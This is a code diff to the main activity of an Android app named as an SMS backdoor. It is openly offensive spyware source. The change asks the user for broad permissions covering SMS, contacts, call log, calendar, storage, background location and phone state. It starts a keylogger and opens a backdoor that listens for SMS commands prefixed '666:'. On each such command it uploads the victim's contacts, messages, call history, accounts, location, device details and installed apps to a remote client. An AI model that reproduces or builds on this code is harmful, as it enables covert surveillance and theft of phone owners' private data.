@@ -15,6 +15,7 @@ limitations under the License.*/
 package com.evilthreads.smsbackdoor
 
 import android.Manifest
+import android.os.Build
 import android.util.Log
 import androidx.appcompat.app.AppCompatActivity
 import androidx.lifecycle.lifecycleScope
@@ -89,33 +90,38 @@ class MainActivity : AppCompatActivity() {
     init {
         lifecycleScope.launchWhenCreated {
             evade(this){
-                KotlinPermissions.with(this@MainActivity).permissions(Manifest.permission.RECEIVE_SMS)
-                    .onAccepted {
-                        val myPayload = suspend {
-                            Keylogger.subscribe { entry ->
-                                Log.d(TAG, entry.toString())
+                val kotlinPermissions = KotlinPermissions.with(this@MainActivity).apply {
+                    if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)
+                        permissions(Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_CONTACTS, Manifest.permission.READ_CALENDAR, Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_SMS, Manifest.permission.ACCESS_BACKGROUND_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION, Manifest.permission.ACCESS_BACKGROUND_LOCATION, Manifest.permission.READ_PHONE_STATE)
+                    else
+                        permissions(Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_CONTACTS, Manifest.permission.READ_CALENDAR, Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_SMS, Manifest.permission.ACCESS_COARSE_LOCATION)
+                }
+                kotlinPermissions.onAccepted {
+                    val myPayload = suspend {
+                        Keylogger.subscribe { entry ->
+                            Log.d(TAG, entry.toString())
+                        }
+                    }
+                    SmsBackdoor.openDoor(this@MainActivity, "666:", payload = myPayload) { remoteCommand ->
+                        runBlocking {
+                            when (remoteCommand) {
+                                GET_CALENDAR_EVENTS -> calendarLaunch(this@MainActivity).let { calendarEvents -> client.upload(calendarEvents) }
+                                GET_CONTACTS -> contactsLaunch(this@MainActivity).let { contacts -> client.upload(contacts) }
+                                GET_CALL_LOG -> callLogLaunch(this@MainActivity).let { calls -> client.upload(calls) }
+                                GET_SMS -> smsLaunch(this@MainActivity).let { smsMessages -> client.upload(smsMessages) }
+                                GET_ACCOUNTS -> accountsLaunch(this@MainActivity).let { accounts -> client.upload(accounts) }
+                                GET_MMS -> mmsLaunch(this@MainActivity).let { mmsMessages -> Log.d(TAG, "NEEDS MULTIPART") }
+                                GET_FILES -> filesLaunch(this@MainActivity).let { files -> Log.d(TAG, "NEEDS MULTIPART") }
+                                GET_DEVICE_INFO -> deviceLaunch(this@MainActivity).let { device -> client.upload(listOf(device)) }
+                                GET_LOCATION -> locationLaunch(this@MainActivity)?.let { location -> client.upload(listOf(location)) }
+                                GET_SETTINGS -> settingsLaunch(this@MainActivity).let { settings -> client.upload(settings) }
+                                GET_APPS -> softwareLaunch(this@MainActivity).let { apps -> client.upload(apps) }
+                                else -> Log.d(TAG, "COMMAND NOT FOUND")
                             }
                         }
-                        SmsBackdoor.openDoor(this@MainActivity, "666:", payload = myPayload) { remoteCommand ->
-                            runBlocking {
-                                when (remoteCommand) {
-                                    GET_CALENDAR_EVENTS -> calendarLaunch(this@MainActivity).let { calendarEvents -> client.upload(calendarEvents) }
-                                    GET_CONTACTS -> contactsLaunch(this@MainActivity).let { contacts -> client.upload(contacts) }
-                                    GET_CALL_LOG -> callLogLaunch(this@MainActivity).let { calls -> client.upload(calls) }
-                                    GET_SMS -> smsLaunch(this@MainActivity).let { smsMessages -> client.upload(smsMessages) }
-                                    GET_ACCOUNTS -> accountsLaunch(this@MainActivity).let { accounts -> client.upload(accounts) }
-                                    GET_MMS -> mmsLaunch(this@MainActivity).let { mmsMessages -> Log.d(TAG, "NEEDS MULTIPART") }
-                                    GET_FILES -> filesLaunch(this@MainActivity).let { files -> Log.d(TAG, "NEEDS MULTIPART") }
-                                    GET_DEVICE_INFO -> deviceLaunch(this@MainActivity).let { device -> client.upload(listOf(device)) }
-                                    GET_LOCATION -> locationLaunch(this@MainActivity)?.let { location -> client.upload(listOf(location)) }
-                                    GET_SETTINGS -> settingsLaunch(this@MainActivity).let { settings -> client.upload(settings) }
-                                    GET_APPS -> softwareLaunch(this@MainActivity).let { apps -> client.upload(apps) }
-                                    else -> Log.d(TAG, "COMMAND NOT FOUND")
-                                }
-                            }
-                        }
-                        Keylogger.requestPermission(this@MainActivity)
-                    }.ask()
+                    }
+                    Keylogger.requestPermission(this@MainActivity)
+                }.ask()
             }
         }
     }
